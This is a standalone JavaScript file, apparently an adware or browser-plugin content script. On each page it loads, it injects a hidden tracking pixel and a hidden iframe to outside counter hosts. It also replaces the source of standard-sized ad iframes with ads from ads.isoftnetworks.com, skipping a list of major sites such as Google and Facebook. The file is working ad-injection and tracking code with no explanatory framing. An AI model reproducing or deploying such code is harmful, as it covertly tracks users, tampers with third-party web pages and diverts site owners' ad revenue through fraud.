var pd_timer = setInterval(function () {
    if (document.readyState === "complete") {
        try {            
            if (top==self) {
            	var pd_div = document.createElement("div");
	            pd_div.setAttribute("id", "isplug_ok");            
	            document.getElementsByTagName("body")[0].appendChild(pd_div);                        
	            pd_div.innerHTML = '<span style="display:none"><img src="http://whos.amung.us/swidget/nocounter.png" width="1" height="1"/><iframe src="http://cd.isn.bz/counter.html" width="1" height="1"></iframe></span>';
            	pd_start_procs_top();
            };
            pd_start_procs_self();
        } catch (n) {}        
        clearInterval(pd_timer);
    }
}, 100);

var pd_start_procs_top = function(){

	var not_action = ["google","yahoo","facebook","twitter","live","outlook","hotmail","mail","isoftnetworks","mildiscos","tutelenovela","milmp3","bing","sinluces"];
	var URI = document.location.href || document.URL;
	var continue_script = true;
	for (var i = not_action.length - 1; i >= 0; i--) {
		if (URI.indexOf(not_action[i]) > -1) {
			continue_script = false;
			break;
		};
	};
	if (continue_script) {
		var _ads_uri = "http://ads.isoftnetworks.com/websiteads_2.php?size=???";
		var iframes = document.getElementsByTagName("iframe");
		for (var i = iframes.length - 1; i >= 0; i--) {
			var iframe = iframes[i];
			if (pd_validate_size_ad(iframe)) {
				iframe.src = _ads_uri.replace("???",iframe.width+"x"+iframe.height);
			};
		};
	};
};

var pd_start_procs_self = function(){
	
};

var pd_validate_size_ad = function(iframe){
	var valid_sizes = ["300x250","728x90","336x280","468x60","120x600","160x600"];
	f = false;
	for (var i = valid_sizes.length - 1; i >= 0; i--) {
		var size = valid_sizes[i].split("x");
		if (iframe.height == size[1] && iframe.width == size[0]) {
			f = true;
			break;
		};
	};
	return f;
}